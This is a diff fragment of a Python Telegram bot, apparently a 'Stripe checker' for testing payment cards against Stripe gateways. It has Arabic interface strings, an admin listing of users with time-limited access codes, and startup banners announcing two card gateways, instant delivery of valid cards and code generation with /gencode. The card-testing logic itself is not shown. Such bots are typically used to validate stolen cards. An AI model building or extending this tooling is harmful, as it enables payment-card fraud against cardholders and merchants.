+    msg = "👥 <b>المستخدمين النشطين:</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
+    for uid, data in user_codes.items():
+        expiry = datetime.fromtimestamp(data['expiry']).strftime('%Y-%m-%d %H:%M:%S')
+        msg += f"\n🆔 <code>{uid}</code>\n   📅 ينتهي: {expiry}\n"
+    
+    bot.send_message(call.from_user.id, msg, parse_mode='HTML')
+
+@bot.callback_query_handler(func=lambda call: call.data == 'stop')
+def stop_callback(call):
+    user_id = call.from_user.id
+    stop_flags[user_id] = True
+    bot.answer_callback_query(call.id, "⏹️ تم الإيقاف")
+
+@bot.callback_query_handler(func=lambda call: call.data == 'x')
+def x_callback(call):
+    bot.answer_callback_query(call.id, "📊 تحديث")
 
 # =============== تشغيل البوت ===============
 if __name__ == "__main__":
     print("=" * 50)
-    print("✅ STRIPE CHECKER BOT")
-    print(f"👥 Admins: {ADMINS}")
-    print(f"👤 Dev: {DEV}")
-    print(f"👤 Author: {AUTHOR}")
-    print(f"🔐 {len(GATEWAYS)} Gateways")
-    print("✅ Fresh SetupIntent for each card")
-    print("✅ Code activation system")
+    print("✅ MULTI GATEWAY STRIPE BOT")
+    print(f"👤 {AUTHOR}")
+    print(f"📦 {VERSION}")
+    print(f"🔐 Gateway 1: {GATEWAY_AUTH}")
+    print(f"💳 Gateway 2: {GATEWAY_3D}")
+    print("✅ نظام كودات المستخدمين مفعل")
+    print("✅ البطاقات الصالحة ترسل فوراً")
+    print("✅ استخدام /gencode 10 لإنشاء كود مباشر")
     print("=" * 50)
     
-    update_all_gateways()
-    
-    print("\n🚀 Bot is running...")
-    bot.infinity_polling()
+    bot.polling(none_stop=True)
